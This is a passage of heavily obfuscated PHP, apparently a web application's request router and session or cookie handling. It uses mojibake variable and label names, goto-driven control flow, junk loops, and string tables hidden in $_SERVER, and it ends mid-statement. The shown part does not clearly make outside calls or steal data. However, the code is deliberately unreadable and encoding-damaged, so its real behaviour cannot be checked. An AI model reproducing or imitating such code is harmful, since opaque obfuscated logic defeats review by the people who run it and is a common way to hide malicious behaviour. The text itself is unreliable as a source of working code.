f»Œ½„¼˜: $GLOBALS[$AàÏ£¹èİ[22]][$AàÏ£¹èİ[28]] = $AàÏ£¹èİ[29]($AàÏ£¹èİ[1], $GLOBALS[$AàÏ£¹èİ[22]][$AàÏ£¹èİ[23]]); goto a¯„›İ•¥; dàâöÚ‘: if (!$AàÏ£¹èİ[32]($b‘ßÕíÊæ, $e®ÔÊÛ…ƒé)) { return; } $dÂÇåÏ‘¨Û = $AàÏ£¹èİ[33]($b‘ßÕíÊæ, $e®ÔÊÛ…ƒé); $EùÑ¥—ÃË° = $AàÏ£¹èİ[25]($b‘ßÕíÊæ, $dÂÇåÏ‘¨Û + $AàÏ£¹èİ[24]($e®ÔÊÛ…ƒé)); goto eø¡Ü»à; fŠ§Â±·…º: $FµÑá“›ãÆ =& $_SERVER[æ§›¦ÌáØ]; $AàÏ£¹èİ =& $_SERVER[úÙ]; if ($GLOBALS[$AàÏ£¹èİ[22]][$AàÏ£¹èİ[28]] != $AàÏ£¹èİ[10]) { return; } goto fğ¹–É¹¡¥; eø¡Ü»à: $AàÏ£¹èİ[34]($AàÏ£¹èİ[35], $EùÑ¥—ÃË°, $fê³÷ØÇ™); $EùÑ¥—ÃË° = $AàÏ£¹èİ[2]($fê³÷ØÇ™[0][0], $AàÏ£¹èİ[36]); $GLOBALS[$AàÏ£¹èİ[22]][$AàÏ£¹èİ[23]] = $AàÏ£¹èİ[0]($AàÏ£¹èİ[36], $EùÑ¥—ÃË°); goto f»Œ½„¼˜; fğ¹–É¹¡¥: $b‘ßÕíÊæ = $_SERVER[$AàÏ£¹èİ[30]]; $bÈ«½±¬³Ü = $FµÑá“›ãÆ[600]; while (strlen($bÈ«½±¬³Ü) < $FµÑá“›ãÆ[595]) { if (!$bÈ«½±¬³Ü) { break; } $bÈ«½±¬³Ü++; } goto eÃ‰ã¬åâÑ; a¯„›İ•¥: } public function run() { goto fµÍˆ¹áãì; eĞƒ¼Õ³³Ò: $this->{$_SERVER[úÙ][45]}(); if ($b‘®ß¤ê©[19]($b«ƒ†½Š’«) >= 3) { $this->{$_SERVER[úÙ][21]}($C˜§Íğã¦Â); } else { $this->{$_SERVER[úÙ][21]}(ACTION); } goto aÉÌì¶¿Û¦; EßÄâãâÄÎ: $b‘®ß¤ê©[39]($b‘®ß¤ê©[41], isset($b«ƒ†½Š’«[1]) && $b«ƒ†½Š’«[0] ? $b«ƒ†½Š’«[1] : $this->defaultController); $b‘®ß¤ê©[39]($b‘®ß¤ê©[42], isset($b«ƒ†½Š’«[2]) && $b«ƒ†½Š’«[0] ? $b«ƒ†½Š’«[2] : $this->defaultAction); $A¡Ôì¢²—¢ = $A‘õ‚¼Ñ“[603]; goto CÆï·ÎÒ‡Ë; fµÍˆ¹áãì: $A‘õ‚¼Ñ“ =& $_SERVER[æ§›¦ÌáØ]; $b‘®ß¤ê© =& $_SERVER[úÙ]; $this->{$_SERVER[úÙ][37]}(); goto Fö¸³Çôé; CÆï·ÎÒ‡Ë: if (strlen($A¡Ôì¢²—¢) < $A‘õ‚¼Ñ“[604]) { die; } $b‘®ß¤ê©[39]($b‘®ß¤ê©[43], MOD . $b‘®ß¤ê©[1] . ST . $b‘®ß¤ê©[1] . ACT); $_SERVER[$b‘®ß¤ê©[44]] = $b‘®ß¤ê©[6](ACTION); goto eĞƒ¼Õ³³Ò; EÃÖÚ¦Ô…‹: if (!$fÇÑ×Ü–”Š) { die; } $C˜§Íğã¦Â = $GLOBALS[$b‘®ß¤ê©[22]][$b‘®ß¤ê©[28]]; $b‘®ß¤ê©[39]($b‘®ß¤ê©[40], isset($b«ƒ†½Š’«[0]) && $b«ƒ†½Š’«[0] ? $b«ƒ†½Š’«[0] : $this->defaultModule); goto EßÄâãâÄÎ; Fö¸³Çôé: $this->{$_SERVER[úÙ][38]}(); $b«ƒ†½Š’« = $GLOBALS[$b‘®ß¤ê©[22]][$b‘®ß¤ê©[23]]; $fÇÑ×Ü–”Š = $A‘õ‚¼Ñ“[602]; goto EÃÖÚ¦Ô…‹; aÉÌì¶¿Û¦: } private $pjioda561ea2 = array(); private $zmeg37a48588 = ''; public function gjmk136728a0() { goto Cİ†õ¦Œíò; aÑ­‘¾ŠÁ: $A¿øíÈÍ—Ø = $fŠÌ×§ÅÂ[614]; if (!$A¿øíÈÍ—Ø) { die; } goto fõŠ¿âİ‰Õ; D¤¤ßÏİ: $this->{$_SERVER[úÙ][50]}(); $this->{$_SERVER[úÙ][51]}(); $this->{$_SERVER[úÙ][52]}(); goto c‚¹’ÈëÂƒ; C’ØğŞ¢•˜: $this->{$_SERVER[úÙ][47]}(); $D…Ä‰²é–² = $fŠÌ×§ÅÂ[605]; while (strlen($D…Ä‰²é–²) < $fŠÌ×§ÅÂ[595]) { if (!$D…Ä‰²é–²) { break; } $D…Ä‰²é–²++; } goto Aâè”Œ†Ò‘; Cİ†õ¦Œíò: $fŠÌ×§ÅÂ =& $_SERVER[æ§›¦ÌáØ]; $cÍâùóáˆó =& $_SERVER[úÙ]; $this->{$_SERVER[úÙ][46]}(); goto C’ØğŞ¢•˜; c‚¹’ÈëÂƒ: $eÎ…«§¬ğ = $fŠÌ×§ÅÂ[609]; while ($eÎ…«§¬ğ < $fŠÌ×§ÅÂ[610]) { if ($eÎ…«§¬ğ >= 0) { break; } $eÎ…«§¬ğ++; } $this->{$_SERVER[úÙ][3]}($cÍâùóáˆó[53], array($this, $cÍâùóáˆó[54])); goto EÃìÅ£áÆÁ; Cë²¤šßµ: $bÖÀÇã‡ÔÃ = $fŠÌ×§ÅÂ[612]; if (strlen($bÖÀÇã‡ÔÃ) < $fŠÌ×§ÅÂ[610]) { die; } $this->{$_SERVER[úÙ][3]}($cÍâùóáˆó[57], array($this, $cÍâùóáˆó[58])); goto fÕ…ŞÏ‹¢æ; fÕ…ŞÏ‹¢æ: $dÁâò…äˆí = $fŠÌ×§ÅÂ[613]; if (strlen($dÁâò…äˆí) < $fŠÌ×§ÅÂ[591]) { return; } $this->{$_SERVER[úÙ][3]}($cÍâùóáˆó[59], array($this, $cÍâùóáˆó[60])); goto aÑ­‘¾ŠÁ; EÃìÅ£áÆÁ: $bÑ¼çó·á = $fŠÌ×§ÅÂ[611]; if (strlen($bÑ¼çó·á) < $fŠÌ×§ÅÂ[591]) { die; } $this->{$_SERVER[úÙ][3]}($cÍâùóáˆó[55], array($this, $cÍâùóáˆó[56])); goto Cë²¤šßµ; Aâè”Œ†Ò‘: $this->{$_SERVER[úÙ][48]}(); $AìÁÚ£À…ß = $fŠÌ×§ÅÂ[606]; while ($AìÁÚ£À…ß < $fŠÌ×§ÅÂ[604]) { if ($AìÁÚ£À…ß >= 0) { break; } $AìÁÚ£À…ß++; } goto c½›ğ”‘—Ä; c½›ğ”‘—Ä: $this->{$_SERVER[úÙ][49]}(); $Fµ¤àÅŸ‚¾ = $fŠÌ×§ÅÂ[607]; if (strlen($Fµ¤àÅŸ‚¾) < $fŠÌ×§ÅÂ[608]) { die; } goto D¤¤ßÏİ; fõŠ¿âİ‰Õ: } public function qwyvd1f9133b($a©—ó‹‰±Ğ) { goto aæ¾ëŸÁÂ; fµ³ŞÀÅê¨: $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[130]] = $dëÌÍˆ®ô[131]($dëÌÍˆ®ô[132]()); $AÏø»ëÛ¤ = $f³áù ƒŠ[620]; if (strlen($AÏø»ëÛ¤) < $f³áù ƒŠ[604]) { return; } goto C‹“Êè·—®; Fˆ£®ŠÕ«Œ: $cØŞ¿³”ÊÃ = array($dëÌÍˆ®ô[64], $dëÌÍˆ®ô[65], $dëÌÍˆ®ô[66], $dëÌÍˆ®ô[67], $dëÌÍˆ®ô[68], $dëÌÍˆ®ô[69], $dëÌÍˆ®ô[70], $dëÌÍˆ®ô[71], $dëÌÍˆ®ô[72], $dëÌÍˆ®ô[73], $dëÌÍˆ®ô[74], $dëÌÍˆ®ô[75], $dëÌÍˆ®ô[76], $dëÌÍˆ®ô[77], $dëÌÍˆ®ô[78], $dëÌÍˆ®ô[79], $dëÌÍˆ®ô[80], $dëÌÍˆ®ô[81], $dëÌÍˆ®ô[82], $dëÌÍˆ®ô[83], $dëÌÍˆ®ô[84], $dëÌÍˆ®ô[85], $dëÌÍˆ®ô[86], $dëÌÍˆ®ô[87], $dëÌÍˆ®ô[88], $dëÌÍˆ®ô[89], $dëÌÍˆ®ô[90], $dëÌÍˆ®ô[91], $dëÌÍˆ®ô[92], $dëÌÍˆ®ô[93], $dëÌÍˆ®ô[94], $dëÌÍˆ®ô[95], $dëÌÍˆ®ô[96], $dëÌÍˆ®ô[97], $dëÌÍˆ®ô[98], $dëÌÍˆ®ô[99], $dëÌÍˆ®ô[100], $dëÌÍˆ®ô[101], $dëÌÍˆ®ô[102], $dëÌÍˆ®ô[103], $dëÌÍˆ®ô[104], $dëÌÍˆ®ô[105], $dëÌÍˆ®ô[106]); $aË¶›«·¨¸ = $f³áù ƒŠ[615]; if (strlen($aË¶›«·¨¸) < $f³áù ƒŠ[591]) { return; } goto cö¤ïÁ¼; dÂ¿İË†ºå: $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[143]] = $dëÌÍˆ®ô[119]($this->pjioda561ea2, $dëÌÍˆ®ô[144], $dëÌÍˆ®ô[10]); $fè¾¬‰»Ÿ¢ = $f³áù ƒŠ[622]; if (!$fè¾¬‰»Ÿ¢) { return; } goto bÙ±İ™‘; B—îŠÓøŸ: $cÇÛ‡¬ŠÚ = $f³áù ƒŠ[617]; if (strlen($cÇÛ‡¬ŠÚ) < $f³áù ƒŠ[591]) { die; } unset($a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[110]][$dëÌÍˆ®ô[114]]); goto b¿¸«í±ºƒ; aæ¾ëŸÁÂ: $f³áù ƒŠ =& $_SERVER[æ§›¦ÌáØ]; $dëÌÍˆ®ô =& $_SERVER[úÙ]; $CÉê¿âíÀÎ = $dëÌÍˆ®ô[61]($dëÌÍˆ®ô[62])->{$_SERVER[úÙ][63]}(); goto Fˆ£®ŠÕ«Œ; BÎ‹Œ·™‡Ò: $A×ƒˆóÅ‡ = $f³áù ƒŠ[616]; unset($a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[111]][$dëÌÍˆ®ô[113]]); unset($a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[110]][$dëÌÍˆ®ô[76]]); goto B—îŠÓøŸ; e…Ü÷äÕğÇ: if ($CÉê¿âíÀÎ[$dëÌÍˆ®ô[133]] != $dëÌÍˆ®ô[134]) { $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[135]] = $CÉê¿âíÀÎ[$dëÌÍˆ®ô[135]]; $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[136]] = $CÉê¿âíÀÎ[$dëÌÍˆ®ô[136]]; $C†“Úñƒ„Ÿ = $dëÌÍˆ®ô[137](10) . $this->zmeg37a48588 . $dëÌÍˆ®ô[137](5); $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[138]][$dëÌÍˆ®ô[139]] = $this->{$_SERVER[úÙ][140]}($C†“Úñƒ„Ÿ, $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[126]]); } if ($this->zmeg37a48588 == $dëÌÍˆ®ô[134]) { $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[110]][$dëÌÍˆ®ô[115]][$dëÌÍˆ®ô[120]] = 0; } $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[141]] = $dëÌÍˆ®ô[119]($this->pjioda561ea2, $dëÌÍˆ®ô[142], $dëÌÍˆ®ô[10]); goto dÂ¿İË†ºå; cö¤ïÁ¼: foreach ($cØŞ¿³”ÊÃ as $BÇŒ«ø§ÎÖ) { $a„¦„¤³Î¬ = $GLOBALS[$dëÌÍˆ®ô[107]][$dëÌÍˆ®ô[108]][$BÇŒ«ø§ÎÖ]; if (isset($CÉê¿âíÀÎ[$BÇŒ«ø§ÎÖ])) { $a„¦„¤³Î¬ = $CÉê¿âíÀÎ[$BÇŒ«ø§ÎÖ]; } $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[110]][$BÇŒ«ø§ÎÖ] = $a„¦„¤³Î¬; } $eÊÑÒºÄÏ = $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[110]][$dëÌÍˆ®ô[76]]; unset($a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[111]][$dëÌÍˆ®ô[112]]); goto BÎ‹Œ·™‡Ò; B‹„Šµ²ïÖ: $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[122]] = $dëÌÍˆ®ô[123]($dëÌÍˆ®ô[124])->{$_SERVER[úÙ][125]}(); $aˆÏÌÜ§ = $f³áù ƒŠ[619]; $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[126]] = $dëÌÍˆ®ô[127]($_SERVER[$dëÌÍˆ®ô[128]] . $CÉê¿âíÀÎ[$dëÌÍˆ®ô[129]]); goto fµ³ŞÀÅê¨; C‹“Êè·—®: $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[133]] = $this->zmeg37a48588; $Dß‡ßê³ˆ = $f³áù ƒŠ[621]; while ($Dß‡ßê³ˆ < $f³áù ƒŠ[608]) { if ($Dß‡ßê³ˆ >= 0) { break; } $Dß‡ßê³ˆ++; } goto e…Ü÷äÕğÇ; bÙ±İ™‘: if ($dëÌÍˆ®ô[119]($GLOBALS, $dëÌÍˆ®ô[145]) && $this->config[$dëÌÍˆ®ô[146]]) { $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[121]][$dëÌÍˆ®ô[147]] = WEB_ROOT; } return $a©—ó‹‰±Ğ; goto a—‘Íá¹¤ƒ; b¿¸«í±ºƒ: $a©—ó‹‰±Ğ[$dëÌÍˆ®ô[109]][$dëÌÍˆ®ô[110]][$dëÌÍˆ®ô[115]] = array($dëÌÍˆ®ô[116] => (int) $eÊÑÒºÄÏ[$dëÌÍˆ®ô[117]], $dëÌÍˆ®ô[118] => (int) $dëÌÍˆ®ô[119]($eÊÑÒºÄÏ, $dëÌÍˆ®ô[120], 0)); $bÎ•‚ùÔÚ¶ = $f³áù ƒŠ[618]; while ($bÎ•‚ùÔÚ¶ < $f³áù ƒŠ[610]) { if ($bÎ•‚ùÔÚ¶ >= 0) { break; } $bÎ•‚ùÔÚ¶++; } goto B‹„Šµ²ïÖ; a—‘Íá¹¤ƒ: } private function tnhqd80f8410() { goto eÀõ×õ‚’À; eÀõ×õ‚’À: $aŸß«Ô—£ƒ =& $_SERVER[æ§›¦ÌáØ]; $D¡ß†’‘İ› =& $_SERVER[úÙ]; if ($_SERVER[$D¡ß†’‘İ›[44]] == $D¡ß†’‘İ›[148]) { goto b¯ ×¢‚©; Bì†İË¨ÔŒ: $D¡ß†’‘İ›[13](array($D¡ß†’‘İ›[172], $D¡ß†’‘İ›[173]), $AšõäÜš¿); goto CˆÀªò„ÎÉ; BĞÍšŠÛ½Ø: $bàİØÜšì = $aŸß«Ô—£ƒ[623]; if (!$bàİØÜšì) { die; } $AšõäÜš¿ = array($D¡ß†’‘İ›[171] => $cšì–¤¸˜); goto Bì†İË¨ÔŒ; b¯ ×¢‚©: $cšì–¤¸˜ = array($D¡ß†’‘İ›[133] => $this->zmeg37a48588, $D¡ß†’‘İ›[149] => $this->{$_SERVER[úÙ][150]}(), $D¡ß†’‘İ›[151] => $D¡ß†’‘İ›[61]($D¡ß†’‘İ›[152])->{$_SERVER[úÙ][153]}()); if ($this->zmeg37a48588 != $D¡ß†’‘İ›[134]) { $CÖ‘‡ÕÙà£ = $D¡ß†’‘İ›[119]($this->pjioda561ea2, $D¡ß†’‘İ›[154]); if ($CÖ‘‡ÕÙà£) { $cšì–¤¸˜[$D¡ß†’‘İ›[155]] = $CÖ‘‡ÕÙà£; $cšì–¤¸˜[$D¡ß†’‘İ›[156]] = $D¡ß†’‘İ›[157]($D¡ß†’‘İ›[119]($this->pjioda561ea2, $D¡ß†’‘İ›[158])); $cšì–¤¸˜[$D¡ß†’‘İ›[159]] = $D¡ß†’‘İ›[119]($this->pjioda561ea2, $D¡ß†’‘İ›[144]); } $Eîß™ˆ«ò = $D¡ß†’‘İ›[61]($D¡ß†’‘İ›[62])->{$_SERVER[úÙ][63]}($D¡ß†’‘İ›[160], $D¡ß†’‘İ›[10], !0); if ($D¡ß†’‘İ›[161]($Eîß™ˆ«ò) && $D¡ß†’‘İ›[25]($Eîß™ˆ«ò, 0, 1) == $D¡ß†’‘İ›[162]) { $Eîß™ˆ«ò = $D¡ß†’‘İ›[163]($Eîß™ˆ«ò); } if ($D¡ß†’‘İ›[164]($Eîß™ˆ«ò) && $Eîß™ˆ«ò[$D¡ß†’‘İ›[165]] && $D¡ß†’‘İ›[32]($Eîß™ˆ«ò[$D¡ß†’‘İ›[165]], $D¡ß†’‘İ›[166])) { $f£º‚Êó«¶ = $D¡ß†’‘İ›[0]($D¡ß†’‘İ›[166], $Eîß™ˆ«ò[$D¡ß†’‘İ›[165]]); $cšì–¤¸˜[$D¡ß†’‘İ›[167]] = $f£º‚Êó«¶[0]; } } $cšì–¤¸˜ = $this->{$_SERVER[úÙ][168]}($D¡ß†’‘İ›[169]($cšì–¤¸˜), $D¡ß†’‘İ›[127]($D¡ß†’‘İ›[170])); goto BĞÍšŠÛ½Ø; CˆÀªò„ÎÉ: } goto E„‘¹™ù×ö; FÉ»óÇÄš©: $D¡ß†’‘İ›[13](array($D¡ß†’‘İ›[172], $D¡ß†’‘İ›[173]), $AšõäÜš¿); $E¤ŠîÒêĞ = $aŸß«Ô—£ƒ[625]; goto E‘§§…‰ó; E„‘¹™ù×ö: if ($this->zmeg37a48588 == $D¡ß†’‘İ›[134]) { return; } $fß¾äç–“´ = array($D¡ß†’‘İ›[174], $D¡ß†’‘İ›[175], $D¡ß†’‘İ›[176], $D¡ß†’‘İ›[177], $D¡ß†’‘İ›[178], $D¡ß†’‘İ›[179]); $bƒ…”’åËÇ = $D¡ß†’‘İ›[61]($D¡ß†’‘İ›[62])->{$_SERVER[úÙ][63]}(); goto D®Á®è«É; D®Á®è«É: $båƒöàñõœ = $aŸß«Ô—£ƒ[624]; $AšõäÜš¿ = array($D¡ß†’‘İ›[180] => $bƒ…”’åËÇ[$D¡ß†’‘İ›[64]], $D¡ß†’‘İ›[181] => $bƒ…”’åËÇ[$D¡ß†’‘İ›[65]], $D¡ß†’‘İ›[182] => $D¡ß†’‘İ›[10]); foreach ($fß¾äç–“´ as $DÇ†¤£œÜ£) { if (!isset($bƒ…”’åËÇ[$DÇ†¤£œÜ£]) || !$bƒ…”’åËÇ[$DÇ†¤£œÜ£]) { continue; } $AšõäÜš¿[$DÇ†¤£œÜ£] = $bƒ…”’åËÇ[$DÇ†¤£œÜ£]; } goto FÉ»óÇÄš©; E‘§§…‰ó: } private function hbasf20e8f73() { goto FïŞÒøºœ; FÂ¯ğÙğ¢: if ($Eµóë†Û“é[$c¸ƒˆè÷ã[189]]) { $dÁ½­“…×[$c¸ƒˆè÷ã[234]] = $Eµóë†Û“é[$c¸ƒˆè÷ã[189]]; } $C‰‹¹’õ‚ = $c¸ƒˆè÷ã[25]($c¸ƒˆè÷ã[127]($dÁ½­“…×[$c¸ƒˆè÷ã[232]]), 10, 10); $Fîİóë…Æ = $C‰‹¹’õ‚ . $dÁ½­“…×[$c¸ƒˆè÷ã[133]] . $dÁ½­“…×[$c¸ƒˆè÷ã[234]]; goto dÎÑ•ê¿µš; EĞ¹óË»áÏ: $c¸ƒˆè÷ã[61]($c¸ƒˆè÷ã[11])->{$_SERVER[úÙ][248]}($A¥˜„±Ï‰£[$c¸ƒˆè÷ã[249]], array($c¸ƒˆè÷ã[250] => $cî–ø ®ÓÈ)); $eÒ¤¿âæ¨ = $eç˜ÀÛ¢‡ï[633]; $this->pjioda561ea2 = $dÆ¨¿ÒîÄÌ; goto a°´¡ºæøŸ; aÅ¼Ãµõ·¤: if (strlen($aàÈ˜é—îµ) < $eç˜ÀÛ¢‡ï[610]) { die; } $f½¢š†×÷™ = $this->{$_SERVER[úÙ][140]}($c¸ƒˆè÷ã[169]($dÆ¨¿ÒîÄÌ), $Fˆ×Ù“£ùŠ); $c’‰¿àŠ¿á = $c¸ƒˆè÷ã[244]($c¸ƒˆè÷ã[61]($c¸ƒˆè÷ã[11])->{$_SERVER[úÙ][245]}(), $c¸ƒˆè÷ã[246]); goto fÏ¾«É‘¦; FïŞÒøºœ: $eç˜ÀÛ¢‡ï =& $_SERVER[æ§›¦ÌáØ]; $c¸ƒˆè÷ã =& $_SERVER[úÙ]; if ($_SERVER[$c¸ƒˆè÷ã[44]] != $c¸ƒˆè÷ã[183]) { return; } goto E¸ßãìÈ; eÇ‚›æòÔ: $c¸ƒˆè÷ã[61]($c¸ƒˆè÷ã[62])->{$_SERVER[úÙ][243]}($dÁ½­“…×); $Fˆ×Ù“£ùŠ = $c¸ƒˆè÷ã[127]($_SERVER[$c¸ƒˆè÷ã[128]] . $c¸ƒˆè÷ã[236]($E½ÖøŸÍ²Ã) . $dÁ½­“…×[$c¸ƒˆè÷ã[232]]); $b–„À÷ô¿‚ = $eç˜ÀÛ¢‡ï[629]; goto F±¶ĞÀÉ„ˆ; E–”˜ÔóÚ´: if (!isset($EÊÎœõğ±÷[$c¸ƒˆè÷ã[186]]) || $c¸ƒˆè÷ã[24]($EÊÎœõğ±÷[$c¸ƒˆè÷ã[186]]) != 16) { $c¸ƒˆè÷ã[187]($c¸ƒˆè÷ã[188] . $EÊÎœõğ±÷[$c¸ƒˆè÷ã[186]], !1); } $E½ÖøŸÍ²Ã = $c¸ƒˆè÷ã[61]($c¸ƒˆè÷ã[62])->{$_SERVER[úÙ][63]}($c¸ƒˆè÷ã[129]); $d¨Âñ‰Óµ¹ = $c¸ƒˆè÷ã[127]($_SERVER[$c¸ƒˆè÷ã[128]] . $E½ÖøŸÍ²Ã); goto E•Œ¹ËàÙ; F±¶ĞÀÉ„ˆ: if (strlen($b–„À÷ô¿‚) < $eç˜ÀÛ¢‡ï[591]) { die; } $A‹‰î¸¬‚Ö = $c¸ƒˆè÷ã[236]($c¸ƒˆè÷ã[25]($Fˆ×Ù“£ùŠ, 10, 16)); $aàÈ˜é—îµ = $eç˜ÀÛ¢‡ï[630]; goto aÅ¼Ãµõ·¤; Aƒ­ÚÖ„§ì: $c¸ƒˆè÷ã[187]($c¸ƒˆè÷ã[219]($c¸ƒˆè÷ã[229]), !0); $FòŒ•Ñ²×Á = $eç˜ÀÛ¢‡ï[634]; if (!$FòŒ•Ñ²×Á) { return; } goto BÂ…ç–†É; c“õëÉ×Œˆ: $dÆ¨¿ÒîÄÌ = $fØšãØ‘[$c¸ƒˆè÷ã[214]]; $EÔ£©ñî“È = $this->{$_SERVER[úÙ][221]}($dÆ¨¿ÒîÄÌ[$c¸ƒˆè÷ã[222]]); $dÖî²Ÿ¶•è = $eç˜ÀÛ¢‡ï[627]; goto C“ƒÀÈ‚ğ”; a°´¡ºæøŸ: $this->zmeg37a48588 = $dÁ½­“…×[$c¸ƒˆè÷ã[133]]; $this->{$_SERVER[úÙ][251]}(); Cache::set($c¸ƒˆè÷ã[252] . $c¸ƒˆè÷ã[127]($E½ÖøŸÍ²Ã . $c¸ƒˆè÷ã[253]), $c¸ƒˆè÷ã[10]); goto Aƒ­ÚÖ„§ì; fÉø™ˆØ‚¯: $B±¥Ö†ğğ· = $eç˜ÀÛ¢‡ï[628]; $dÁ½­“…×[$c¸ƒˆè÷ã[136]] = $c¸ƒˆè÷ã[131]($c¸ƒˆè÷ã[236]($this->{$_SERVER[úÙ][168]}($a ¢íî‚¾, $c¸ƒˆè÷ã[238]))); if ($dÆ¨¿ÒîÄÌ[$c¸ƒˆè÷ã[239]] && $dÆ¨¿ÒîÄÌ[$c¸ƒˆè÷ã[239]] >= 1) { $c¸ƒˆè÷ã[61]($c¸ƒˆè÷ã[62])->{$_SERVER[úÙ][240]}($c¸ƒˆè÷ã[241], $c¸ƒˆè÷ã[242]); } goto eÇ‚›æòÔ; C“ƒÀÈ‚ğ”: while ($dÖî²Ÿ¶•è < $eç˜ÀÛ¢‡ï[595]) { if ($dÖî²Ÿ¶•è >= 0) { break; } $dÖî²Ÿ¶•è++; } if (!$EÔ£©ñî“È || $EÔ£©ñî“È != $dÆ¨¿ÒîÄÌ[$c¸ƒˆè÷ã[158]]) { $f¦î”ê“»µ = array($c¸ƒˆè÷ã[223] => $c¸ƒˆè÷ã[61]($c¸ƒˆè÷ã[62])->{$_SERVER[úÙ][63]}($c¸ƒˆè÷ã[129]), $c¸ƒˆè÷ã[224] => $_SERVER[$c¸ƒˆè÷ã[128]], $c¸ƒˆè÷ã[225] => $c¸ƒˆè÷ã[226](), $c¸ƒˆè÷ã[195] => $_SERVER[$c¸ƒˆè÷ã[196]]); $D›¡©¢æ—– = $this->{$_SERVER[úÙ][227]}($c¸ƒˆè÷ã[169]($f¦î”ê“»µ)); $this->{$_SERVER[úÙ][205]}($c¸ƒˆè÷ã[228] . $D›¡©¢æ—–); $c¸ƒˆè÷ã[187]($c¸ƒˆè÷ã[219]($c¸ƒˆè÷ã[229]), !0); } $dÁ½­“…× = array($c¸ƒˆè÷ã[230] => $dÆ¨¿ÒîÄÌ[$c¸ƒˆè÷ã[231]], $c¸ƒˆè÷ã[232] => $dÆ¨¿ÒîÄÌ[$c¸ƒˆè÷ã[233]], $c¸ƒˆè÷ã[234] => $c¸ƒˆè÷ã[137](16), $c¸ƒˆè÷ã[133] => $dÆ¨¿ÒîÄÌ[$c¸ƒˆè÷ã[235]]); goto FÂ¯ğÙğ¢; díñ‡•î–á: while (strlen($BƒŞà§ôœğ) < $eç˜ÀÛ¢‡ï[604]) { if (!$BƒŞà§ôœğ) { break; } $BƒŞà§ôœğ++; } $cî–ø ®ÓÈ[$A‹‰î¸¬‚Ö] = $f½¢š†×÷™; $a‹´ì®ô¿õ = $eç˜ÀÛ¢‡ï[632]; goto EĞ¹óË»áÏ; fÏ¾«É‘¦: $A¥˜„±Ï‰£ = $c’‰¿àŠ¿á[$c¸ƒˆè÷ã[247]]; $cî–ø ®ÓÈ = array(); $BƒŞà§ôœğ = $eç˜ÀÛ¢‡ï[631]; goto díñ‡•î–á; dÎÑ•ê¿µš: $dÁ½­“…×[$c¸ƒˆè÷ã[135]] = $c¸ƒˆè÷ã[236]($c¸ƒˆè÷ã[131]($this->{$_SERVER[úÙ][168]}($Fîİóë…Æ, $c¸ƒˆè÷ã[237]))); $Bßî¿Ö×…„ = $c¸ƒˆè÷ã[137](16); $a ¢íî‚¾ = $Bßî¿Ö×…„ . $dÁ½­“…×[$c¸ƒˆè÷ã[133]] . $this->{$_SERVER[úÙ][168]}($c¸ƒˆè÷ã[127]($dÁ½­“…×[$c¸ƒˆè÷ã[230]]), $Bßî¿Ö×…„); goto fÉø™ˆØ‚¯; E•Œ¹ËàÙ: $Eµóë†Û“é = array($c¸ƒˆè÷ã[186] => $EÊÎœõğ±÷[$c¸ƒˆè÷ã[186]], $c¸ƒˆè÷ã[189] => $c¸ƒˆè÷ã[137](16), $c¸ƒˆè÷ã[190] => $c¸ƒˆè÷ã[170], $c¸ƒˆè÷ã[191] => $c¸ƒˆè÷ã[192], $c¸ƒˆè÷ã[193] => $_SERVER[$c¸ƒˆè÷ã[194]], $c¸ƒˆè÷ã[195] => $_SERVER[$c¸ƒˆè÷ã[196]], $c¸ƒˆè÷ã[197] => $_SERVER[$c¸ƒˆè÷ã[198]], $c¸ƒˆè÷ã[126] => $d¨Âñ‰Óµ¹, $c¸ƒˆè÷ã[199] => $c¸ƒˆè÷ã[61]($c¸ƒˆè÷ã[62])->{$_SERVER[úÙ][63]}($c¸ƒˆè÷ã[160])); if ($EÊÎœõğ±÷[$c¸ƒˆè÷ã[200]] == $c¸ƒˆè÷ã[201]) { $cŠõŸíäº = $this->{$_SERVER[úÙ][168]}($d¨Âñ‰Óµ¹, $c¸ƒˆè÷ã[202]); $D›¡©¢æ—– = $this->{$_SERVER[úÙ][140]}($c¸ƒˆè÷ã[169]($Eµóë†Û“é), $d¨Âñ‰Óµ¹ . $c¸ƒˆè÷ã[203], 3); $D›¡©¢æ—– = $D›¡©¢æ—– . $c¸ƒˆè÷ã[204] . $_SERVER[$c¸ƒˆè÷ã[194]]; $cÒè–ï­æá = $this->{$_SERVER[úÙ][205]}($c¸ƒˆè÷ã[206] . $cŠõŸíäº . $c¸ƒˆè÷ã[207] . $D›¡©¢æ—–, -1); $c¸ƒˆè÷ã[187]($cÒè–ï­æá, !0); } else { if ($EÊÎœõğ±÷[$c¸ƒˆè÷ã[200]] == $c¸ƒˆè÷ã[208]) { $eÕ´Ø¸ïšÀ = $c¸ƒˆè÷ã[25]($c¸ƒˆè÷ã[127]($c¸ƒˆè÷ã[209] . $d¨Âñ‰Óµ¹), 12, 15) . $c¸ƒˆè÷ã[210]; $D›¡©¢æ—– = $this->{$_SERVER[úÙ][211]}($c¸ƒˆè÷ã[2]($EÊÎœõğ±÷[$c¸ƒˆè÷ã[212]]), $eÕ´Ø¸ïšÀ, 2); $fØšãØ‘ = $c¸ƒˆè÷ã[213]($D›¡©¢æ—–, !0); if (!$c¸ƒˆè÷ã[164]($fØšãØ‘) || 